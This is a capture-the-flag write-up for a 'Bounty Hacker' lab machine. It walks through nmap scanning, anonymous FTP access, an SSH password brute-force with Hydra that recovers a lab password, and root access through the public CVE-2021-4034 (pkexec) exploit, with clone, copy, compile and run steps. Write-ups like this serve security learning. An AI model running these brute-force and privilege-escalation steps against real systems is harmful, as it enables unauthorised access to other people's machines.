# Bounty Hacker

## data

### IP

IP address: `10.10.112.50`

### NMAP

```
# Nmap 7.92 scan initiated Sun Jun 12 00:43:23 2022 as: nmap -sV -oN nmap.txt 10.10.112.50
Nmap scan report for 10.10.112.50
Host is up (0.049s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 12 00:43:36 2022 -- 1 IP address (1 host up) scanned in 13.08 seconds
```
## Probing

### Enumeration

#### Feroxbuster

nothing

#### Dirbuster



### FTP

The ftp server has anonymous login enabled, but passive mode is enabled.

Type `passive` to disable passive mode

Listing the directory contents (`ls`), The file tasks.txt is readable.
Here Lin wrote:

```
ftp> less task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

locks.txt contains a bunch of passwords, with which we may be able to bruteforce ssh

## Bruteforcing ssh using Hydra

```
hydra -l lin -P locks.txt ssh://10.10.33.188
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-02 12:29:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.33.188:22/
[22][ssh] host: 10.10.33.188   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-02 12:29:30

```

password = RedDr4gonSynd1cat3

## Privesc

using ssh we can read the users.txt file. This contains the first flag. With linpeas, we discover that the target is vurnerable to 
CVE-2021-4034.

### CVE-2021-4034

This is a privesc vurnerability. The description is as follows:

```
A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.
```

To use this CVE, we can use the github project https://github.com/berdav/CVE-2021-4034

1. Clone the repo on the attacker host

```bash
git clone https://github.com/berdav/CVE-2021-4034.git
```

2. Copy the repo to the target

```bash
scp -r CVE-2021-4034 lin@10.10.33.188:/home/lin
```

3. compile the repo by running the `make` command

4. run `./cve-2021-4034`

5. Read the `root.txt` flag in the `/root` folder



